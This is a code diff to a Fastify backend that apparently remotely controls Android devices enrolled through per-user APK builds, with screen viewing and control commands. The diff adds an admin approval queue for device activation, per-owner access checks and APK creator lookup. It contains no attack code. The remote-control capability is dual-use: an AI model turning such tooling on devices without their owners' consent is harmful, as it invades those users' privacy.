@@ -1,6 +1,6 @@
 import type { FastifyInstance } from 'fastify';
 import { getDb, dbHelpers } from '../db/index.js';
-import { clients, users, buildRecords } from '../db/schema.js';
+import { clients, users, buildRecords, deviceCredentials, deviceEnrollments } from '../db/schema.js';
 import type { clients as ClientsTable } from '../db/schema.js';
 import { eq, desc } from 'drizzle-orm';
 import { socketService } from '../services/socket.js';
@@ -16,6 +16,9 @@ import {
   deleteDeviceCredential,
   DeviceAuthError,
   provisionDevice,
+  listActivationRequests,
+  approveActivationRequest,
+  rejectActivationRequest,
   revokeDeviceCredential,
   rotateDeviceCredential,
 } from '../services/deviceAuth.js';
@@ -69,6 +72,13 @@ function isValidIceHost(host: string): boolean {
 
 function isFiniteNumber(value: unknown): value is number {
   return typeof value === 'number' && Number.isFinite(value);
+}
+
+function hasClientAccess(request: any, client: any): boolean {
+  const user = getRequestUser(request);
+  if (user?.role === 'admin') return true;
+  const ownerId = client?.ownerId ?? client?.owner_id ?? null;
+  return ownerId != null && ownerId === user?.userId;
 }
 
 function validateRealtimeCommand(cmd: CmdType, params: Record<string, unknown>): string | null {
@@ -156,6 +166,9 @@ export async function deviceRoutes(app: FastifyInstance) {
     const body = (request.body || {}) as Record<string, unknown>;
     const bootstrapToken = typeof body.bootstrapToken === 'string' ? body.bootstrapToken.trim() : '';
     const deviceId = typeof body.deviceId === 'string' ? body.deviceId.trim() : '';
+    const model = typeof body.model === 'string' ? body.model.trim().slice(0, 200) : undefined;
+    const manufacturer = typeof body.manufacturer === 'string' ? body.manufacturer.trim().slice(0, 200) : undefined;
+    const release = typeof body.release === 'string' ? body.release.trim().slice(0, 100) : undefined;
     if (bootstrapToken.length < 32 || bootstrapToken.length > 256) {
       return reply.code(400).send({ success: false, error: 'Invalid enrollment token' });
     }
@@ -164,7 +177,7 @@ export async function deviceRoutes(app: FastifyInstance) {
     }
 
     try {
-      const deviceSecret = provisionDevice(bootstrapToken, deviceId);
+      const deviceSecret = provisionDevice(bootstrapToken, deviceId, { model, manufacturer, release });
       reply.header('Cache-Control', 'no-store');
       reply.header('Pragma', 'no-cache');
       return { success: true, data: { deviceSecret } };
@@ -175,6 +188,48 @@ export async function deviceRoutes(app: FastifyInstance) {
       log.error(`Device enrollment failed for ${deviceId}: ${err instanceof Error ? err.message : String(err)}`);
       return reply.code(500).send({ success: false, error: 'Device enrollment failed' });
     }
+  });
+
+  // Admin-only activation queue. Each APK build may have many device requests,
+  // but every individual device must be explicitly approved before credentials are issued.
+  app.get('/api/device/enrollment-requests', {
+    preHandler: [app.auth, requirePermission('device:activation')],
+  }, async (request) => {
+    const actor = getRequestUser(request);
+    const ownerUserId = actor?.role === 'admin' ? null : (actor?.userId ?? -1);
+    return { success: true, data: { requests: listActivationRequests(ownerUserId) } };
+  });
+
+  app.post('/api/device/enrollment-requests/:id/approve', {
+    preHandler: [app.auth, requirePermission('device:activation')],
+  }, async (request, reply) => {
+    const { id } = request.params as { id: string };
+    const actor = getRequestUser(request);
+    if (!id || id.length > 128) {
+      return reply.code(400).send({ success: false, error: 'Invalid activation request id' });
+    }
+    const ownerUserId = actor?.role === 'admin' ? null : (actor?.userId ?? -1);
+    if (!approveActivationRequest(id, ownerUserId)) {
+      return reply.code(404).send({ success: false, error: 'Pending activation request not found' });
+    }
+    dbHelpers.addLog('ADMIN', 'SECURITY', `Device activation request ${id} approved by ${actor.username}`, JSON.stringify({ requestId: id }));
+    return { success: true, requestId: id };
+  });
+
+  app.post('/api/device/enrollment-requests/:id/reject', {
+    preHandler: [app.auth, requirePermission('device:activation')],
+  }, async (request, reply) => {
+    const { id } = request.params as { id: string };
+    if (!id || id.length > 128) {
+      return reply.code(400).send({ success: false, error: 'Invalid activation request id' });
+    }
+    const actor = getRequestUser(request);
+    const ownerUserId = actor?.role === 'admin' ? null : (actor?.userId ?? -1);
+    if (!rejectActivationRequest(id, ownerUserId)) {
+      return reply.code(404).send({ success: false, error: 'Pending activation request not found' });
+    }
+    dbHelpers.addLog('ADMIN', 'SECURITY', `Device activation request ${id} rejected`);
+    return { success: true, requestId: id };
   });
 
   app.get('/api/clients', {
@@ -242,6 +297,9 @@ export async function deviceRoutes(app: FastifyInstance) {
     const client = d.select().from(clients).where(eq(clients.id, id)).get();
     if (!client) {
       return reply.code(404).send({ success: false, error: 'Client not found' });
+    }
+    if (!hasClientAccess(request, client)) {
+      return reply.code(403).send({ success: false, error: 'Not allowed' });
     }
 
     reply.header('Cache-Control', 'no-store');
@@ -317,6 +375,10 @@ export async function deviceRoutes(app: FastifyInstance) {
     if (!client) {
       return reply.code(404).send({ success: false, error: 'Client not found' });
     }
+    if (!hasClientAccess(request, client)) {
+      return reply.code(403).send({ success: false, error: 'Not allowed' });
+    }
+
     const data = getPageData(id, page, client);
     return { success: true, data };
   });
@@ -407,6 +469,15 @@ export async function deviceRoutes(app: FastifyInstance) {
     const cmdType = cmd as CmdType;
     if (!Object.values(CMD).includes(cmdType)) {
       return reply.code(400).send({ success: false, error: 'Invalid command' });
+    }
+
+    const d = getDb();
+    const client = d.select().from(clients).where(eq(clients.id, id)).get();
+    if (!client) {
+      return reply.code(404).send({ success: false, error: 'Client not found' });
+    }
+    if (!hasClientAccess(request, client)) {
+      return reply.code(403).send({ success: false, error: 'Not allowed' });
     }
 
     const screenCommands: CmdType[] = [CMD.SCREEN, CMD.SCREEN_CTRL, CMD.WEBRTC_OFFER, CMD.WEBRTC_ICE];
@@ -626,32 +697,63 @@ export function formatClient(client: ClientRow) {
 
 export function formatClientWithOwner(client: ClientRow) {
   const base = formatClient(client as any);
-  // owner_id / ownerId may be undefined in older DB rows; normalize to owner: null or { id, username }
-  const ownerId = (client as any).ownerId ?? (client as any).owner_id ?? (client as any).creatorId ?? (client as any).creator_id ?? null;
-  // If no explicit ownerId but client has build_id, try to resolve build's creator
-  if (!ownerId) {
+  const d = getDb();
+  const explicitOwnerId = (client as any).ownerId ?? (client as any).owner_id ?? null;
+
+  // Resolve the APK build even for older clients whose clients.build_id is empty.
+  // The device credential keeps the enrollment id, and the enrollment keeps build_id.
+  let buildId = (client as any).buildId ?? (client as any).build_id ?? null;
+  if (!buildId) {
     try {
-      const d = getDb();
-      const buildId = (client as any).buildId ?? (client as any).build_id;
-      if (buildId) {
-        const build = d.select().from(buildRecords).where(eq(buildRecords.id, buildId)).get();
-        const bOwnerId = build ? (build.creatorId ?? (build as any).creator_id) : null;
-        if (bOwnerId) {
-          const owner = d.select().from(users).where(eq(users.id, bOwnerId)).get();
-          if (owner) return { ...base, owner: { id: owner.id, username: owner.username, email: owner.email } };
-        }
+      const credential = d.select().from(deviceCredentials)
+        .where(eq(deviceCredentials.deviceId, client.id))
+        .get();
+      if (credential?.enrollmentId) {
+        const enrollment = d.select().from(deviceEnrollments)
+          .where(eq(deviceEnrollments.id, credential.enrollmentId))
+          .get();
+        buildId = enrollment?.buildId ?? null;
       }
-    } catch (e) {
-      // ignore lookup errors
+    } catch {
+      // Legacy databases may not have the relationship populated.
     }
   }
-  if (!ownerId) return { ...base, owner: null };
-  try {
-    const d = getDb();
-    const owner = d.select().from(users).where(eq(users.id, ownerId)).get();
-    if (!owner) return { ...base, owner: null };
-    return { ...base, owner: { id: owner.id, username: owner.username, email: owner.email } };
-  } catch {
-    return { ...base, owner: null };
+
+  let apkCreator: { id: number; username: string; email: string } | null = null;
+  let apkName: string | null = null;
+  if (buildId) {
+    try {
+      const build = d.select().from(buildRecords).where(eq(buildRecords.id, buildId)).get();
+      if (build) {
+        apkName = build.appName ?? null;
+        const creatorId = build.creatorId ?? null;
+        if (creatorId) {
+          const creator = d.select().from(users).where(eq(users.id, creatorId)).get();
+          if (creator) {
+            apkCreator = { id: creator.id, username: creator.username, email: creator.email };
+          }
+        }
+      }
+    } catch {
+      // Ignore lookup errors and still return the device.
+    }
   }
+
+  let owner: { id: number; username: string; email: string } | null = null;
+  if (explicitOwnerId) {
+    try {
+      const ownerRow = d.select().from(users).where(eq(users.id, explicitOwnerId)).get();
+      if (ownerRow) owner = { id: ownerRow.id, username: ownerRow.username, email: ownerRow.email };
+    } catch {
+      // Ignore lookup errors.
+    }
+  }
+
+  return {
+    ...base,
+    buildId: buildId ?? null,
+    apkName,
+    apkCreator,
+    owner,
+  };
 }
